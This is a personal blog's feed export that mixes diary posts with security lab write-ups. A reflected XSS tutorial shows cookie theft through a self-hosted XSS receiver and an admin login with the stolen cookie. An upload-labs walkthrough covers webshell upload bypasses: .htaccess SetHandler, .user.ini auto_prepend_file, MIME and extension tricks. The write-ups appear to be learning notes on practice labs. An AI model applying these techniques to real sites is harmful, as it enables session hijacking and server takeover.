class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>我们输入的参数原封不动地输出到页面，存在反射型xss。</p><p><strong>以盗取cookie为例</strong></p><p>思路：利用xss漏洞，构造payload，需要实现的效果：当用户点击链接，即点击我们构造的payload时，触发读取用户在漏洞站点上的cookie的js代码。</p><p>即重点一是js怎么写，重点二是payload怎么写。</p><p>解决方法：完成这个功能的js代码会比较长，所以我们不再像之前的<code>alert()</code>直接写在payload里触发，而是写进一个js文件，储存在我们的服务器中。而我们构造的payload只是一段简单的js代码，功能是让用户访问我们服务器上的这个js文件。也就是说，当用户点击我们构造的payload，就会访问我们服务器上构造好的js代码（这个过程可以伪装，即在用户的角度上并没有意识到xss攻击），从而使我们读取到用户在具有xss漏洞站点的cookie。</p><p><em>（这只是一种主流的方法，不一定是唯一的方法，怎么利用取决于不同的环境以及JavaScript能执行怎样的功能，例如如果是用post方式提交的数据包的话，就没有直接可利用的链接来用户点击来触发js代码。这样的话我们可以写一个HTML页面，该页面的功能就是自动提交目标网站具有xss漏洞的页面的表单，同时用js代码读取当前用户cookie，再把数据发送给攻击者。我们把这个页面布置到服务器上诱导用户点击即可）</em></p><p>即我们还需要搭建一个网站来使用户访问，并在这个网站上布置js代码。这导致了xss的渗透不仅在本地环境复现比较复杂，而且在实际环境下还需要一定的成本，学习比较繁琐。针对这一情况，网上已经有了公共的xss平台， 也就是说我们构造的payload要使用户访问这个xss平台，并且平台也能提供了一些js模板来使用，通过这个平台我们也能更好地利用xss漏洞。如果只是本地复现的话，自己搭建平台也可以。在这里我搭建的是BlueLotus_XSSReceiver。</p><p>下面展示在本地环境下利用BlueLotus_XSSReceiver来盗取用户cookie。</p><p><strong>利用BlueLotus_XSSReceiver平台的详细步骤</strong>：</p><p>先生成一个js模板，这里我选的模板是default.js，官方介绍说这个模板包能完成xss的基本攻击</p><p>选好模块后设置好参数</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220306233110.png"></p><p>我的xss平台搭建在本地虚拟环境中，主机作为用户，所以需要分别把js文件和payload中的IP地址改为xss平台所在主机中的内网ip地址（注意js文件中的接收页面是ip/BlueLotus_XSSReceiver/index.php），使用户（即主机）能够访问到。</p><p>构造payload，诱使用户点击。我们这里即把平台生成的payload提交的xss漏洞处即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307184800.png"></p><p>此时我们平台的接收面版已经有了信息</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307184858.png"></p><p>复制盗取来的cookie值</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307194408.png"></p><p>接着访问对应网站，可以用浏览器插件或按f12进入开发者页面修改cookie值。修改cookie后注意直接访问内部的页面，访问登录页面是没用的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307195024.png"></p><p>可以看到我们没有输入账号密码，直接用admin账户登录成功</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220307200723.png"></p><p>如要实现其它功能，如屏幕截图、读取键盘输入，使用平台提供的对应js模板或自己修改js文件即可。</p><hr><p>参考：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p><p>​            《web安全攻防》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从《1367》到《老人与海》</title>
    <link href="/2022/03/04/%E4%BB%8E%E3%80%8A1367%E3%80%8B%E5%88%B0%E3%80%8A%E8%80%81%E4%BA%BA%E4%B8%8E%E6%B5%B7%E3%80%8B/"/>
    <url>/2022/03/04/%E4%BB%8E%E3%80%8A1367%E3%80%8B%E5%88%B0%E3%80%8A%E8%80%81%E4%BA%BA%E4%B8%8E%E6%B5%B7%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<p>前两天，我参加了一个与陌生人交换书的活动。</p><span id="more"></span><hr><p>规则大致就是你寄书给朋友的朋友，然后自己另一个朋友的朋友寄书给你，相当于陌生人之间的交换。</p><p>起初我并不对自己能收到书抱有期望，只是我刚好手边有本快读完的《1367》。虽然我真的很想留住这本书，但我想，把这本书分享出去的意义会更大。于是我就参加了这个活动。</p><p>最初我要买这本书时，只是因为该书的推荐语是“国产推理的巅峰”，没想到拿到书时就被吓了一跳，当时还发了条qq动态。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220304220702.png"></p><p>竟然是港版的，与大陆书的主要区别就是繁体字，竖行，左开本。</p><p><strong>既然都是“国产推理的天花板了”，为什么大陆不出版？</strong>除了倍感新鲜外，也大致猜到了书里内容不简单。</p><p>书中前几章都是常规的本格推理模式，采用倒序的方式讲述了从2013-1967在香港发生的几桩案件，作者的确构思巧妙，诡计别出心裁，揭秘谜底时让我十分震撼。但最让我深思的，还是最后一章的故事，我猜主要也是因为这部分导致该书不能在大陆出版。</p><p>最后一章讲述的是“67暴动”。左派罢工，并采取激烈的斗争，放置炸弹来对抗香港政府。左派人员，香港皇家警察，无辜市民，三方伤亡惨重。甚至书中最残酷的一起事件也是历史上曾真实发生的写照。</p><p>在书中，我是大陆人自然先站在了左派人员的角度思考，所记叙的事让我觉得扭曲而虚幻，可这些都是血泪的历史。而惨剧发生，事件落幕后，书中一个角色的这句话，<strong>“你要保护的，到底是员警的招牌？还是市民的安全？你效忠的是港英政权，还是香港市民？你，为什么要当警察？”</strong>，也住了噎书里的警察主角。</p><p>当我看到有人讨论此书时，果然看到了一种评论，一种在中国大陆普遍存在的态度：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_223253.jpg"></p><p>但是紧接着，我也看到了另一种评论，一种我认为更值得可取的态度：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_223434.jpg"></p><p>“六七事件”在百度也能查到较为详细且客观的叙述，我相信我们，同香港市民总有一天能直面这段历史，理性分析，从中吸取教训。</p><p>致敬如今像书中那般，公正无私，保护市民的警察同志，也愿两岸人民消除偏见与隔阂，和睦相处，团结一致。</p><p>上面就是我为什么要寄书的故事了。虽然我重点写了书中有关社会方面的内容，但这本书本质还是一本十分优秀的本格推理小说。关于政治的部分作者也并没有夹带私货，反而理性客观。如果这篇文章有幸被您看到，希望您能读读这本佳作。您可以不去想那严肃沉重的历史，跟随作者的节奏，自然领略书中的情节就好了。</p><p>我寄书前，也跟收书的同学打了个电话。我只提到了港版书，希望他不要被繁体吓到。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_212623.jpg"></p><p>之后这位同学还发了个短信表示感谢，哈哈😊</p><p>关于这个活动收书的部分，果然是没有人鸟我。我还是主动找了一个平时看书的hxd争取一下。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Screenshot_20220304_213426_com.tencent.mobileqq_e.jpg"></p><p>他要参加活动，寄皮皮鲁给别人，我觉得很有趣。而机缘之下，他朋友会寄给我一本书，我收到之后发现是英文版的《老人与海》。</p><p>好家伙我上次6级还就那个刚好没过，而且《老人与海》也是一个经典的故事。这个小时候曾读过的故事，我只记得当时因老人失败而产生的巨大落差。现在我其实知道或许不是失败，就像小时候被叫着去读《老人与海》一样，我现在被教育老人没有失败。</p><p><em>A man can be destroyed but not defeated</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/TOMADTS.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
      <tag>不敏感</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022</title>
    <link href="/2022/02/01/2022/"/>
    <url>/2022/02/01/2022/</url>
    
    <content type="html"><![CDATA[<p>2022年1月31日为除夕。我1月30日晚回老家，2月1日又回来。也许在路上的意义会比较重要因为在路上花的时间似乎都比我在老家呆的时间长。</p><span id="more"></span><hr><p>过年前一周我看完了马尔克斯的《霍乱时期的爱情》和《百年孤独》。看完之后我顺便了解了一下作者的生平，发现作者所写的那么多魔幻现实主义的情节，竟然有着来自于生活的原型，它们取材于自己和身边之人的故事。我也许应该在一个魔幻的地方再生活个二十来年，这样有助于我拿诺贝尔文学奖。至于魔幻的地方就选在中国好了。</p><p>​    中国有这么一点魔幻：在中国的正版单机手游必须要联网。因为国家出台的一系列限制未成年人玩游戏的规定，玩游戏需要实名认证并且游玩过程中需要保持联网，这些都是为了限制未成年人玩游戏。我本以为我会在我有小孩后再来感谢这个政策没想到在我20岁时却因这个政策忧国忧民：未成年人还是会玩游戏，并且他们还只能玩不受监管的盗版游戏。看来游戏厂商里面没有内部人员。回老家途中我为打发时间就想随便玩玩手游，又因为月末了没流量，我就蹭服务区wifi下了好几个单机手游（还有个买断付费的，后面也退款了），结果因为这个政策路上还是什么都玩不了，于是我就忧国忧民了一会儿。只是关于国民的部分就刚才提到那么一点剩下的是忧我自己不能玩游戏。</p><p>​    我可以蹭我爸的热点。但这让我不舒服，就像我不想要压岁钱一样。但就像我还是拿了压岁钱一样，我还是叫我爸帮我开了下热点。也像我不能年年一直要压岁钱一样，我也没有一直用我爸的热点。当然我只是没流量了又不是没电话费，可惜的是电话费以及我所有的生活费都来自于“压岁钱”和我爸的“热点”。我用热点看了好久的美剧《Fridends》来打发时间。下面是剧中我很喜欢的一段话，这段话是剧中Rachel剪断了她父亲给的信用卡后她的朋友Monica对Rachel说的。把它放在这里我觉得也蛮有意思。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/Friends_Quotes_s01e01.jpg"></p><p>回老家一趟后我再看着这段话时不自禁想到外公，某些方面我和他还有些像。只是我也不想多想，也就不多写了。</p><p>上面就是我在路上发生的事了。</p><p>​    在老家发生的就事太多了，如果我再像前文一样啰里啰唆地写出来就把这段博客可以当作一本书出版算了。也许这本书会是诺贝尔文学奖的有力竞争者，前提是人们还喜欢魔幻现实主义。现在是凌晨零点51分，离我平时睡觉时间凌晨两点还有一段时间，但我想以后尽量零点睡觉好了。</p><p>​    </p><p>在老家的事就简单记下吧：</p><p>先去看了我”颠颠的”外婆</p><p>除夕夜我给我的好多朋友打了电话，就像之前我从没用过电话一样。然后我独自在那个简陋的小镇走了一段，边走边放手里的小烟花。</p><p>大年初一上坟，我如果写下我的感受的话我会认为我的感受十分不妥。</p><p>回来时我妈妈把我外公接回来了。</p><hr><p>好的弄完了睡觉。</p><hr><p>呜呜呜假期里好好学习，又玩完了半个假期。</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
      <tag>不敏感</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当伴郎</title>
    <link href="/2021/12/23/%E5%BD%93%E4%BC%B4%E9%83%8E/"/>
    <url>/2021/12/23/%E5%BD%93%E4%BC%B4%E9%83%8E/</url>
    
    <content type="html"><![CDATA[<p>今天我哥结婚，我回去一趟当伴郎</p><span id="more"></span><p>虽然我觉得我好好打理一下穿正装血🐎帅但我还是希望大家对我的印象保持在邋遢和随性所以就不放照片了并且我更喜欢侠隐于市的低调和潇洒😉<br>（当我为了见你而洗头时，希望你能感受到我对你极大的尊重）</p><p>当伴郎最大的感受就是婚礼是两个人的事，也是两个家庭的事，所以目前恋爱的小情侣好好珍惜现在纯粹的爱情吧😄<br>（不是说结了婚你们的爱情就不纯粹了吼）</p><p>两天在两座城市之间的穿梭让我觉得我是一个探险的旅人，是灵魂的躁动驱使我加快脚步<br>但是因为不在学校而错过了选课，现在已经没有课能选了。也罢，反正选修里面也没我喜欢的。我的肉体能忍受车马劳顿而我洗尽铅华的精神已容忍不了冰冷学分对我施加的束缚<br>（等下次选课的时候我应该又成为了俗人就不会在意这些了）</p><p>最后期末加油拒绝摆烂<br>（放假再摆）</p><hr><p>上面是我直接从我qq空间复制的哈哈哈，网上看着可能会觉得有些奇怪我也懒得改了..记录一下</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又有谁会一直挽留呢</title>
    <link href="/2021/11/09/%E5%8F%88%E6%9C%89%E8%B0%81%E4%BC%9A%E4%B8%80%E7%9B%B4%E6%8C%BD%E7%95%99%E5%91%A2/"/>
    <url>/2021/11/09/%E5%8F%88%E6%9C%89%E8%B0%81%E4%BC%9A%E4%B8%80%E7%9B%B4%E6%8C%BD%E7%95%99%E5%91%A2/</url>
    
    <content type="html"><![CDATA[<p>连机器人都不会。</p><span id="more"></span><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211109214520.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20201556.jpg"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211109213851.png"></p><p>（因为偶然点到一个搜索选项，小冰竟然会弹出这样的话，而之前我搜百度的时候记得还老是不让人去百度呢，hh）</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恭喜edg</title>
    <link href="/2021/11/09/%E6%81%AD%E5%96%9Cedg/"/>
    <url>/2021/11/09/%E6%81%AD%E5%96%9Cedg/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>恭喜edg夺冠！（皇杂？真不熟😁），lpl好朋友可汗再次陪跑；meiko大满贯，成为当前lpl第一人；小学弟在edg呆了这么多年，从外援转成了本土，等他说获奖感言时，“为李哥报仇了，很开心”……一代电竞人圆满梦，猪狗大战也早已落下帷幕…</p><p>我虽然不是厂长的粉，但想起Clearlove7，想起年年八强，不得不佩服。</p><p>有件意思的事，那个周末我和一好朋友开黑，他说玩最后几把LOL就不玩了。我问他那你要做什么，他说要做大人该做的事了（他的原话）。最后几把游戏他玩了盖伦，说这是第一个带给他快乐的英雄，玩了杰斯和青钢影，他玩的最多的两个英雄，他想这应该是完美谢幕了吧。那我想我就玩ez吧，主要和我一样帅，完美谢幕嘛。他把游戏卸了，我也是。<br>我还找得到第一次玩英雄联盟的那种感觉吗。时至今日仍记得，我第一个人头是用的死歌拿的，此后任何有关LOL的记忆，于此相比都黯淡不少。</p><p>有句话说得好，你无法同时拥有青春和对青春的感悟。现在几日过去了，残余着些许激动，又怅然若失。只庆幸我还有青春。</p><p>而为梦想拼搏的故事，怎么讲都精彩。</p><p>我现在睡觉都不把手机带上床了，冲。（还不是因为课上摆烂太久了…今年的破防周来的晚一些吧😫）</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload labs通关历程（1~21关）</title>
    <link href="/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/"/>
    <url>/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p> upload-labs,一个专门用于训练文件上传漏洞的靶场。上传漏洞，就是攻击者可上传一个可执行文件，如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p><span id="more"></span><p>这篇文章记录了我通关这个靶场的历程。</p><p><del>上次说记录通关历程的sqlilabs我好像就停在了20关🤔</del></p><hr><p>从第一关，开冲！</p><h3 id="1–格式检查之客户端js"><a href="#1–格式检查之客户端js" class="headerlink" title="1–格式检查之客户端js"></a>1–格式检查之客户端js</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027231935.png"></p><p>很常见的界面，首先直接传入一个写入一句话木马的php文件试试。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232317.png"></p><p>在点击上传后的一瞬间弹出了一个JavaScript的alter，告诉我们限制了文件的类型不能为php。这关的限制很有可能就在前端，上传时没有与服务器交互就直接拒绝了我。可以尝试把木马的php后缀改为<code>jpg</code>，上传<code>jpg</code>文件然后用burp抓包，修改数据再把包发出去。即将下图中的“a.jpg”改为“a.php”。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232640.png"></p><p>接着用蚁剑连接即可。</p><p>文件路径在上传文件后右键图片即可复制获得。</p><p>另外大致可以猜测<strong>这关上传文件的限制代码并没有进行HTTP请求去访问服务器<br> 所以可判断这是前端js验证，验证代码在我们的浏览器上</strong></p><p>我们也可以直接禁用浏览器的JavaScript或删除部分相关的js代码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233354.png"></p><p>然后直接上传“a.php”，显示上传成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233447.png"></p><p>（这一关的提示）</p><p>所以针对有前端限制的代码，可以用burp修改数据包绕过前端的限制，也可以直接通过浏览器禁用前端相关的限制代码。</p><h3 id="2–格式检查之mime-type"><a href="#2–格式检查之mime-type" class="headerlink" title="2–格式检查之mime-type"></a>2–格式检查之mime-type</h3><p>这关同样可以采取修改第一关的方法，上传后缀为jpg的木马文件，burp抓包后再修改回php，即可实现上传。</p><p>但不同的是这次不是通过前端JavaScript代码限制，而是在服务器端对数据包进行了MIME检测。</p><p><em>MIME是一种标准，用来表示文档、文件或字节流的性质和格式</em></p><p>不同类型的文件类型在传输时，有着不同的mime类型，这样浏览器就知道该用什么方式来打开它，和文件后缀的作用一致，只不过文件后缀是让操作系统知道这是什么类型文件，MIME是让信息的接收方知道这是什么类型的文件。</p><p>MIME在数据包中体现在了这一部分：content-type</p><p>如<code>jpg</code>类型的文件在content-type这一栏是image/jpeg</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028163015.png"></p><p>而php类型的文件在这一栏是application/octet-stream</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028162641.png"></p><p>所以除了刚才修改文件后缀的方法，我们也可以通过修改content-type这一属性来实现文件上传。直接上传php文件，然后再把数据包中content-type改为jpg的对应形式，即image/jpeg。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20211028181237168.png"></p><h3 id="3–黑名单之php3"><a href="#3–黑名单之php3" class="headerlink" title="3–黑名单之php3"></a>3–黑名单之php3</h3><p>这关在服务器端进行了黑名单限制，如果匹配到了黑名单中的文件类型就会拒绝本次上传。</p><p>而黑名单最大的问题就是不全。我们的思路就是上传一个黑名单以外并包含php代码的文件，但又要使得我们访问该文时，该文件会被当作php文件类型解析。<code>php3</code>文件和<code>phtml</code>没有在黑名单中，而这两种文件往往也会被当作php文件来解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028183945.png"></p><p>我们可以把后缀改为<code>php3</code>或是<code>phtml</code>上传，上传成功。</p><p>但蚁剑却连接不了，说明php代码并没有生效，我们上传的文件很可能并没有被服务器当作php文件解析。</p><p>这是因为apache服务器的配置文件（httpd_conf）中没有进行相关设置，所以解析不了。所以说这个漏洞属于是网站管理人员配置文件时的失误。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028204830.png"></p><p>将配置文件中这一栏修改为</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029204603.png"></p><p>意思让服务器将<code>php3</code>类型的文件当作php类型来解析。</p><h3 id="4–特殊文件之-htaccess配置文件"><a href="#4–特殊文件之-htaccess配置文件" class="headerlink" title="4–特殊文件之.htaccess配置文件"></a>4–特殊文件之.htaccess配置文件</h3><p>这关看提示，过滤了很多的文件类型。<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028193733.png"></p><p>但是没有过滤掉<code>.htaccess</code>。<strong>注意：当服务器是apache时才有作用</strong></p><p><em><code>.htaccess</code>文件(或者”分布式配置文件”），全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</em></p><p>我们就可以利用<code>.htaccess</code>文件的特性，上传一个具有目的性的<code>.htaccess</code>文件。创建一个txt文件，其内容如下，再将文件名改为.htaccess。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br></code></pre></div></td></tr></table></figure><p><strong>注意是文件名就为<code>.htaccess</code></strong></p><p>这个文件的意思是让服务器将所有的文件都当作php文件来解析。</p><p>这样的话我们上传一个包含php代码且类型不在黑名单中的就行了。（为了方便验证，所以上传的是包含phpinfo()函数的php文件）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030105921.png"></p><p>可以看出访问.png类型的文件时，服务器依然按照php文件解析，证明我们成功了。</p><p>另外上传<code>.htaccess</code>文件对这关配置文件<code>httpd_conf</code>文件也有要求，需要apache加载rewrite模块和允许重写。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110424.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110509.png"></p><p>除了上传.htaccess之外，还可以针对apache的解析机制绕过黑名单的检测。</p><p>Apache会将不认识的后缀，如muma.php.xxx.helloworld、test.php.iii等从右向左解析，不认识就往左移一个，最终移到php时apache认识了就会将该文件当作php文件来解析。</p><p>所以我们还可以上传一个文件后缀为.php.xxxx的木马。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028210833.png"></p><p>同时请注意：这需要前文中提到的配置文件<code>httpd_conf</code>中同样的地方，将最前面的#号注释符删去才会生效，如下图</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029224135.png"></p><h3 id="5–特殊文件之-user-ini配置文件"><a href="#5–特殊文件之-user-ini配置文件" class="headerlink" title="5–特殊文件之.user.ini配置文件"></a>5–特殊文件之.user.ini配置文件</h3><p>这关告诉了我们上传目录中存在着一个php文件以及该文件的名字。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030140412.png"></p><p>我们可以上传.user.ini文件，其内容如下</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file=info.jpg<br><span class="hljs-comment">//info.jpg是我们即将上传的包含php代码的文件</span><br></code></pre></div></td></tr></table></figure><p>从名字大概可以看出这个<code>.user.ini</code>文件是个用户自定义的配置文件，和上一关的<code>.htaccess</code>好像有些像。他们的特点可以参考下面这篇文章<a href="https://blog.csdn.net/since_2020/article/details/113781120?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">.htaccess文件和.user.ini文件_since_2020的博客-CSDN博客_user.ini是什么</a></p><p>简单来说，可以借助<code>.user.ini</code>让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是包含着php代码的非php文件。所以我们上传一个包含php代码的<code>jpg</code>文件，再访问站点中的一个php文件时，服务器在执行这个php文件时会自动包含并执行我们所上传的文件。（这和文件包含漏洞是类似的效果）而这个php文件即提示中的<code>readme.php</code>。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030150849.png"></p><p>这样当我们访问某一个php文件时，自动执行了我们所上传的文件中的php代码。</p><p>另外值得注意的是，这种配置文件好像是有缓存的。当我第一次上传<code>.user.ini</code>文件后，这个<code>.user.ini</code>文件中的内容会管用很长一段时间，哪怕我在服务器端删除了这个<code>.user.ini</code>或上传一个新的<code>.user.ini.</code>都不会立刻生效，还是原来的<code>.user.ini</code>在起作用。</p><p>另外这一关我未能在低版本的环境中复现成功，也许是php或apache版本不对，也许是某个配置文件不对，总之换了一个环境才成功的。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030152156.png"></p><h3 id="6–黑名单之大小写"><a href="#6–黑名单之大小写" class="headerlink" title="6–黑名单之大小写"></a>6–黑名单之大小写</h3><p>通常文件上传的源码中会有很多限制文件后缀的函数，经过这些限制再结合黑名单检测，就可能阻止恶意文件（如php类型）上传。</p><p>黑名单需要全面考虑到才算安全，而全面考虑到几乎不可能，所谓智者千虑，必有一失。所以我们还要结合别的方式来防御，例如利用函数限制文件后缀。在这个靶场里即一些php自带的函数+作者创建的自定义函数。</p><p>从第6关开始接下来几关都是源码文件中漏掉了一两个函数，针对这几个漏掉的函数，我们就可以来构造php后缀名进行绕过。</p><p>先来看看一个较为全面的函数限制：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210921.png"></p><p>上面的步骤进行了以下操作：去除文件前后的空格，去除文件末尾的<code>.</code>，从右往左截取第一个.后面的字符串（截取文件的后缀），并将其转化为小写，去除字符串<code>::$data</code>，去除文件后的空格。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124222954.png"></p><p><strong>接着按照这里的源码规则，我们上传的文件后缀经过这些函数的转换，并通过黑名单检测以后作为新的后缀储存在服务器中。也就是说我们构造的文件后缀不仅需要通过黑名单检测，还需要使其转化后能被解析为php类型的文件，这与第8，10关不同，先在此强调以作对比</strong></p><p>直接来看这几个限制的函数可能会有点奇怪，通过下面几个关卡我们就知道如果没有这些限制的话，我们就能采取哪些方法绕过了。所以大部分文件上传点都会写很多限制函数。</p><p>至于第6关</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106163644.png"></p><p>这关黑名单黑名单忽略了大小写绕过，所以上传后缀为<code>Php</code>的就行了。</p><h3 id="7–黑名单之空格"><a href="#7–黑名单之空格" class="headerlink" title="7–黑名单之空格"></a>7–黑名单之空格</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164049.png"></p><p>因为没有去掉文件末尾的空格，这关可以采用添加空格绕过，上传后缀为<code>.php  </code>+一个空格即可，这样就匹配不到黑名单中的php了。同时该形式的文件在服务器上能被解析为php格式。</p><h3 id="8–黑名单之忽略后缀型-（1）"><a href="#8–黑名单之忽略后缀型-（1）" class="headerlink" title="8–黑名单之忽略后缀型.（1）"></a>8–黑名单之忽略后缀型.（1）</h3><p>因为这里未用deldot函数来删除文件名末尾的点 ，我们可以上传<code>xx.php.</code>文件。截取的后缀为空，匹配不到黑名单。而如果按照前面几关的规则，我们上传的文件会被储存为<code>xx.</code>，因为我们的后缀变成了<code>.</code>。但是这关服务器在储存文件时与前面不同，这里是保留了原文件名（进行了一两步转化）进行储存，变成了<code>xx.php.</code>，我把这称为忽略后缀型的绕过黑名单，第十关也是这样。关于这点我将在第10关的部分详细展开。<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124223928.png"></p><p>最后解析的时候利用了windows的特性，文件名最后的<code>.</code>会被忽略，所以<code>xx.php.</code>会被当作<code>xx.php</code>来解析。如果服务器是Linux的话就不会生效了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164737.png"></p><p>另外这关依旧存在apache的解析漏洞，之前提到的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210525.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210548.png"></p><h3 id="9–黑名单之windows特性-data"><a href="#9–黑名单之windows特性-data" class="headerlink" title="9–黑名单之windows特性::$data"></a>9–黑名单之windows特性::$data</h3><p><img 